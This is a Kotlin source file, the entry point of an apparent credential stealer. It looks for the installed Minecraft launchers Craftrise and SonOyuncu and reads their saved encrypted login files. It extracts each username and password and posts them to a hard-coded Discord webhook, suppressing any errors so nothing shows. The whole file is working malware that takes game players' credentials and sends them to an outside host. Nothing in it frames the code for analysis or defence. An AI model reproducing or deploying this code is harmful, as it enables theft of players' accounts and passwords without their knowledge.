package io.groax.main

import io.groax.api.webhook.EmbedObject
import io.groax.impl.stealer.Craftrise
import io.groax.impl.stealer.SonOyuncu
import io.groax.impl.webhook.WebhookUtil
import java.awt.Color
import java.io.FileNotFoundException
import java.io.IOException
import java.util.*


/**
 * @author Groax
 */
object Runnable {
    @JvmStatic
    fun main(args: Array<String>) {
        try {
            val raccoon = Craftrise()
            if (raccoon.encryptedLocation.exists() && raccoon.encryptedLocation.isFile)
                raccoon.apply {
                    val webhookSender = WebhookUtil("https://canary.discord.com/api/webhooks/963782448938885200/y3udOITullDk8bOPmPOpgMSgstMwBMdYkY_8AA2DDI3InjkmG9JC2q-5fvb8FEC021To")
                    webhookSender.addEmbed(
                        EmbedObject()
                            .setAuthor("", "", "https://www.programtr.net/wp-content/uploads/2020/12/raccoonHead.png")
                            .setColor(Color(Random().nextInt(0xFFFFFF)))
                            .setThumbnail("https://minotar.net/avatar/${raccoon.getUsername()}")
                            .addField("Username", raccoon.getUsername(), true)
                            .addField("Password", raccoon.getPassword(), true)
                    )
                    try {
                        webhookSender.execute()
                    } catch (hata: IOException) {
                    }
                }
        } catch (hata: FileNotFoundException) {
            //Craftrise kurulu değil.
        }
        try {
            val bitwise = SonOyuncu()
            if (bitwise.encryptedLocation.exists() && bitwise.encryptedLocation.isFile)
                bitwise.apply {
                    val webhookSender = WebhookUtil("https://canary.discord.com/api/webhooks/963782448938885200/y3udOITullDk8bOPmPOpgMSgstMwBMdYkY_8AA2DDI3InjkmG9JC2q-5fvb8FEC021To")
                    webhookSender.addEmbed(
                        EmbedObject()
                            .setAuthor("", "", "https://sonoyuncu.com.tr/img/sonoyuncu-logo-registered.png")
                            .setColor(Color(Random().nextInt(0xFFFFFF)))
                            .setThumbnail("https://minotar.net/avatar/${bitwise.getUsername()}")
                            .addField("Username", bitwise.getUsername(), true)
                            .addField("Password", bitwise.getPassword(), true)
                    )
                    try {
                        webhookSender.execute()
                    } catch (hata: IOException) {
                    }
                }
        } catch (hata: FileNotFoundException) {
            //Sonoyuncu kurulu değil.
        }
    }
}